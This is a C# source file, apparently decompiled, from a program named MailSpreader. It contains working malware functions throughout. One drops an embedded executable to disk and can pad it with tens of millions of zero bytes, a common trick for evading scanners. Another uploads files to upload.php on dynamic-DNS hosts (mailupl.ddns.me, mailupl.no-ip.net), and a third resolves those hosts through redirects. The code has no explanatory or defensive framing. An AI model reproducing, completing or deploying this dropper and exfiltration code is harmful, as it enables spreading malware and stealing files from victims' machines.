using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;

namespace MailSpreader;

internal class Functions
{
	public static readonly string[] noip = new string[2] { "http://mailupl.ddns.me/", "http://mailupl.no-ip.net/" };

	public static string[] host = new string[2] { "http://mailupl.ddns.me/", "http://mailupl.no-ip.net/" };

	public bool dropResource(string exeName, bool pump = false)
	{
		try
		{
			string path = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), exeName);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MailSpreader.Resources." + exeName);
			FileStream fileStream = new FileStream(path, FileMode.CreateNew);
			for (int i = 0; i < manifestResourceStream.Length; i++)
			{
				fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
			}
			fileStream.Close();
			if (pump)
			{
				Stream stream = new FileStream(path, FileMode.Append);
				BinaryWriter binaryWriter = new BinaryWriter(stream);
				for (int j = 0; j < 29600000; j++)
				{
					binaryWriter.Write(0);
				}
				binaryWriter.Close();
				stream.Close();
			}
			if (File.Exists(path))
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string uploadFile(string file)
	{
		string text = string.Empty;
		int num = 0;
		while (text != "OK" && num < host.Length)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Content-Type", "binary/octet-stream");
				byte[] array = webClient.UploadFile(host[num] + "upload.php", file);
				text = Encoding.UTF8.GetString(array, 0, array.Length);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			finally
			{
				num++;
			}
		}
		return text;
	}

	public void fixNOIPhosts()
	{
		for (int i = 0; i < host.Length; i++)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(noip[i]);
				httpWebRequest.AllowAutoRedirect = false;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				host[i] = httpWebResponse.Headers["Location"];
				httpWebResponse.Close();
			}
			catch (Exception)
			{
				i--;
			}
		}
	}
}
